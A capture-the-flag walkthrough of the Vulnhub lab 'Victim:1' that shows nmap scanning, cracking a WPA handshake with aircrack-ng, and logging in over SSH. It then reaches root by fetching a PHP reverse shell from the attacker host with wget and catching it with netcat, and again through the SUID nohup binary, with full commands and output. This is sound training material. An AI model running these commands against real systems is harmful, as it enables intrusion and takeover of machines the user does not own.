# Victim:1 Vulnhub Walkthrough

Today we are going to solve another boot2root challenge called “Victim:1”. It is available on Vulnhub for the purpose of Penetration Testing practices. This lab is not that difficult if we have the proper basic knowledge of cracking the labs. This credit of making this lab goes to iamv1nc3nt. Let’s start and learn how to successfully breach it.

Since these labs are available on the Vulnhub Website. We will be downloading the lab file from this **here**.

**Penetration Testing Methodology**

**Reconnaissance**

**Nmap**

**Enumeration**

**Wireshark**

**Exploiting**

**Aircrack-ng****SSH login**

**Privilege Escalation**

**Abusing writeable file****Capture the flag**

**Walkthrough**

**Reconnaissance**

As we always identify host IP using netdiscover command and then continue with network scanning for port enumeration So, let’s start with nmap port enumeration and execute following command in our terminal.

nmap -p- -A 192.168.1.104

From its result, we found ports 22(SSH) , 80(http), 8080(http), 9000(http) were open.


root@kali:~# nmap -p -A 192.168.1.104
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-18 02:44 EDT
Nmap scan report for 192.168.1.104
Host is up (0.00036 latency).
Not shown: 65530 filtered ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: SHA256:U2U2:U2U2:U2U2:U2U2:U2U2:U2U2:U2U2:U2U
|   2048 ea:e8:15:7d:8a:74:bc:45:09:76:34:13:2c:d8:1e:62 (RSA)
|   256 51:75:37:23:b6:0f:7d:ed:61:a0:61:18:21:89:35:5d (ECDSA)
|_  256 7d:36:08:ba:91:ef:24:9f:7b:24:f6:64:c7:53:2c:b0 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 403 Forbidden
8080/tcp open  http    BusyBox httpd 1.13
|_http-title: 404 Not Found
8999/tcp open  http    WebFS httpd 1.21
|_http-server-header: webfs/1.21
|_http-title: 0.0.0.0:8999/
9000/tcp open  http    PHP cgi server 5.5 or later (PHP 7.2.30-1)
|_http-title: Uncaght Exception: MissingDatabaseExtensionException
MAC Address: 08:00:27:AC:14:C3 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open a
Aggressive OS guesses: Linux 2.6.32 (93%), Linux 3.10 (93%), Linux 3.10 - 4.11 (93%),
ux 2.6.22 - 2.6.36 (89%), Linux 2.6.39 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.36 ms 192.168.1.104


**Enumeration**

For more detail, we will be needing to start enumeration against the host machine. Since port 80 is open I look toward browser and explore target ip 192.168.1.104 and found nothing useful.


192.168.1.104/

No configuration file found and no installation code available. Exiting...


Further on enumerating port 8999, the resultant page come up with the WordPress files and here **WPA-01.cap** file looks interesting; I download it to find out some clue.


# listing:

| access    | user    | group    | date    | size | name    |
| drwxr-xr-x  | nobody  | nogroup  | Apr 07 22:38 | <DIR> | wordpress    |
| drwxr-xr-x  | nobody  | nogroup  | Mar 31 20:03 | <DIR> | wp-admin    |
| drwxr-xr-x  | nobody  | nogroup  | Mar 31 20:03 | <DIR> | wp-content    |
| -rw-r--r--  | root    | root    | Apr 07 22:33 | 197  | wp-includes    |
| -rw-r--r--  | nobody  | nogroup  | Feb 06 06:33 | 405  | WPA-01.cap    |
| -rw-r--r--  | nobody  | nogroup  | Feb 12 11:54 | 19   | index.php    |
| -rw-r--r--  | nobody  | nogroup  | Jan 10 14:05 | 7278 | license.txt    |
| -rw-r--r--  | nobody  | nogroup  | Feb 06 06:33 | 6912 | readme.html    |
| -rw-r--r--  | nobody  | nogroup  | Feb 06 06:33 | 351  | wp-activate.php    |
| -rw-r--r--  | nobody  | nogroup  | Feb 06 06:33 | 2275 | wp-blog-header.php |
| -rw-r--r--  | nobody  | nogroup  | Feb 06 06:33 | 2913 | wp-comments-post.php |
| -rw-r--r--  | nobody  | nogroup  | Feb 06 06:33 | 3940 | wp-config-sample.php |
| -rw-r--r--  | nobody  | nogroup  | Feb 06 06:33 | 2496 | wp-cron.php    |
| -rw-r--r--  | nobody  | nogroup  | Feb 06 06:33 | 3300 | wp-links-opml.php |
| -rw-r--r--  | nobody  | nogroup  | Feb 10 03:50 | 46   | wp-load.php    |
| -rw-r--r--  | nobody  | nogroup  | Feb 06 06:33 | 8501 | wp-login.php    |
| -rw-r--r--  | nobody  | nogroup  | Feb 10 22:33 | 18   | wp-mail.php    |
| -rw-r--r--  | nobody  | nogroup  | Feb 06 06:33 | 30   | wp-settings.php    |
| -rw-r--r--  | nobody  | nogroup  | Feb 06 06:33 | 4755 | wp-signup.php    |
| -rw-r--r--  | nobody  | nogroup  | Feb 06 06:33 | 3133 | wp-trackback.php |
| -rw-r--r--  | nobody  | nogroup  | Feb 06 06:33 |    | xmlrpc.php    |

webfs/1.21  18/May/2020 06:46:08 GMT


After downloading the cap file, we need to analyze it. So, when we open this file, it was a Wireshark cap file and by streaming the 1st packet we noticed **SSID: dlink **as shown in the image. This can be probably used as a Password.


File   Edit   View   Go   Capture   Analyze   Statistics   Telephony   Wireless   Tools   Help

Apply a display filter ... <Ctrl-/>

No.    Time    Source    Destination    Protocol    Length
1    0.000000    D-Link_5a:b6:62    Broadcast    802.11    Wireshark-Packet1-WPA-01.cap

+ Frame 1: 260 bytes on wire (2080 bits), 260 bytes captured (2080 bits)
+ IEEE 802.11 Beacon frame, Flags: ......
+ IEEE 802.11 Wireless Management
  + Fixed parameters (12 bytes)
    Timestamp: 8403055760
    Beacon Interval: 0.102400 [Seconds]
  + Capabilities Information: 0x0431
+ Tagged parameters (224 bytes)
  + Tag: SSID parameter set: dlink
    Tag Number: SSID parameter set (0)
    Tag length: 5
    SSID: dlink


**Exploiting **

Further we used aircrack-ng for cracking the file captured.cap using the following command:

aircrack-ng -w /usr/share/wordlists/rockyou.txt WPA-01.cap

After a few minutes, we have found the **key: p4ssword** as shown in the image below.


root@kali:~/Downloads# aircrack-ng -w /usr/share/wordlists/rockyou.txt WPA-01.cap
Reading packets, please wait ...
Opening WPA-01.cap
Read 1918 packets.

  #   BSSID               ESSID         Encryption
  1   5C:D9:98:5A:B6:62   dlink         WPA (1 handshake)

Choosing first network as target.

Reading packets, please wait ...
Opening WPA-01.cap
Read 1918 packets.

1 potential targets

Aircrack-ng 1.6

[00:00:08] 74575/14344392 keys tested (9469.79 k/s)

Time left: 25 minutes, 7 seconds    0.52%

                    KEY FOUND! [p4ssword]

Master Key    : 8F C0 1B 1B 85 06 0B 85 23 7C 83 74 F8 4B 4A FD
                50 CE EC 72 6F 85 17 5F B1 14 5E D2 F2 47 5D 1A

Transient Key : 13 41 36 81 4A 92 19 CF EC 14 B8 FD 20 2C D4 2E
                BA A1 95 79 CE 15 5F 1A 2C DE 03 A8 2B 52 68 64
                D3 77 A7 E4 FF CD 49 0C ED E9 5E 3B 68 E6 83 26
                06 0C 98 8D 43 B6 7C E4 FE ED 2E 45 90 0D 6D 15

EAPOL HMAC    : 33 A5 CE E2 46 DB 4B 96 86 A1 6E D9 D2 A2 A6 E9

root@kali:~/Downloads#


We have a username and a password, so we tried to access the SSH on the target system and were successfully able to log in.

ssh dlink@192.168.1.104

After getting logged in let’s go for post-exploitation and try to escalate root privileged. While doing post enumeration we found writable permission is assigned on /var/www/bolt/public/files.

find / -writable -type d 2>/dev/null
cd /var/www/bolt/public/files
ls -la
cd files/
ls -la


root@kali:~# ssh dlink@192.168.1.104
dlink@192.168.1.104's password:
Last login: Tue Apr  7 23:36:49 2020 from 192.168.86.99
dlink@victim01:~$ find / -writable -type d 2>/dev/null
/run/screen
/run/lock
/home/dlink
/var/www/bolt/app/config
/var/www/bolt/app/cache
/var/www/bolt/app/database
/var/www/bolt/public/files
/var/tmp
/var/lib/lxcfs/proc
/var/lib/lxcfs/cgroup
/var/lib/php/sessions
/var/crash
/tmp
/tmp/.XIM-unix
/tmp/.font-unix
/tmp/.Test-unix
/tmp/.ICE-unix
/tmp/.X11-unix
/proc/13759/task/13759/fd
/proc/13759/fd
/proc/13759/map_files
/dev/mqueue
/dev/shm
dlink@victim01:~$ cd /var/www/bolt/public
dlink@victim01:/var/www/bolt/public$ ls -la
total 40
drwxr-xr-x 7 root root 4096 Apr  7 22:01 .
drwxr-xr-x 7 root root 4096 Apr  7 20:45 ..
-rw-r--r-- 1 root root 2956 Aug 25  2018 .htaccess
drwxr-xr-x 6 root root 4096 Nov 12  2019 bolt-public
-rwxr-xr-x 1 root root   45 Apr  7 22:01 bolt_start.sh
drwxr-xr-x 2 root root 4096 Aug 25  2018 extensions
drwxrwxrwx 2 root root 4096 Nov 12  2019 files
-rw-r--r-- 1 root root  295 Aug 25  2018 index.php
drwxr-xr-x 5 root root 4096 Nov 12  2019 theme
drwxr-xr-x 2 root root 4096 Aug 25  2018 thumbs
dlink@victim01:/var/www/bolt/public$ cd files/
dlink@victim01:/var/www/bolt/public/files$ ls -la
total 16
drwxrwxrwx 2 root root 4096 Nov 12  2019
drwxr-xr-x 7 root root 4096 Apr  7 22:01 ..
-rw-r--r-- 1 root root  195 Nov 12  2019 .htaccess
-rw-r--r-- 1 root root    4 Nov 12  2019 index.html
dlink@victim01:/var/www/bolt/public/files$


Since the file directory was owned by root and also allow write permission for everyone thus we download php-reverse-shell from our local machine into host machine using wget command to do so execute the following command:

wget http://192.168.1.112:8000/php-reverse-shell-php
ls


dlink@victim01:/var/www/bolt/public/files$ wget http://192.168.1.112:8000/php-reverse-shell.php
--2020-05-18 07:02:25--  http://192.168.1.112:8000/php-reverse-shell.php
Connecting to 192.168.1.112:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5495 (5.4K) [application/octet-stream]
Saving to: 'php-reverse-shell.php'

php-reverse-shell.php                                       100%[===============================
2020-05-18 07:02:25 (661 MB/s) - 'php-reverse-shell.php' saved [5495/5495]

dlink@victim01:/var/www/bolt/public/files$ ls
index.html  php-reverse-shell.php
dlink@victim01:/var/www/bolt/public/files$


Further, we will execute our php-reverse-shell in browser but before that fire up netcat in another terminal to get a reverse shell with root privileges and capture the final flag.

nc -lvp 1234
id
cd /root
ls
cat flag.txt


192.168.1.104:9000/files/php-reverse-shell.php



root@kali:~# nc -lvp 1234
listening on [any] 1234 ...
192.168.1.104: inverse host lookup failed: Unknown host
connect to [192.168.1.112] from (UNKNOWN) [192.168.1.104] 48282
Linux victim01 4.15.0-96-generic #97-Ubuntu SMP Wed Apr 1 03:25:46 UTC 2020 x86_64 x86_64
07:05:29 up 22 min, 1 user,  load average: 0.25, 0.45, 0.60
USER    TTY    FROM    LOGIN@    IDLE   JCPU   PCPU WHAT
dlink    pts/0    192.168.1.112    06:56    2:09    0.06s  0.06s -bash
uid=0(root) gid=0(root) groups=0(root)
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
flag.txt
snap
# cat flag.txt
Nice work!


**2**nd method for privilege escalation

ndmethod for privilege escalation

As we know nohup is a command which executes another program specified as its argument and ignores all signup (hangup) signals. It runs with the SUID bit set and may be exploited to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges. **nohup Privilege Escalation**

find / -writable -type d 2>/dev/null
nohup /bin/sh -p -c "sh -p <$(tty) >$(tty) 2>$(tty)"
id
cd /root
ls
cat flag.txt


dlink@victim01:~$ find / -perm -u=s -type f 2>/dev/null
/usr/sbin/pppd
/usr/bin/pkexec
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/nohup
/usr/bin/cnsh
/usr/bin/traceroute6.inputils
/usr/bin/at
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/arping
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/snap/core/9066/bin/mount
/snap/core/9066/bin/ping
/snap/core/9066/bin/ping6
/snap/core/9066/bin/su
/snap/core/9066/bin/unmount
/snap/core/9066/bin/chfn
/snap/core/9066/bin/chsh
/snap/core/9066/bin/gpasswd
/snap/core/9066/bin/newgrp
/snap/core/9066/bin/passwd
/snap/core/9066/bin/sudo
/snap/core/9066/bin/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9066/bin/openssh/ssh-keysign
/snap/core/9066/bin/snapd/snap-confine
/snap/core/9066/bin/sbin/pppd
/bin/mount
/bin/su
/bin/unmount
/bin/ping
/bin/fusermount
dlink@victim01:~$ nohup /bin/sh -p -c "sh -p $(tty) >$(tty) 2>$(tty)"
nohup: ignoring input and appending output to 'nohup.out'
# id
uid=1002(dlink) gid=1004(dlink) euid=0(root) groups=1004(dlink)
# cd /root
# ls
flag.txt  snap
# cat flag.txt
Nice work!
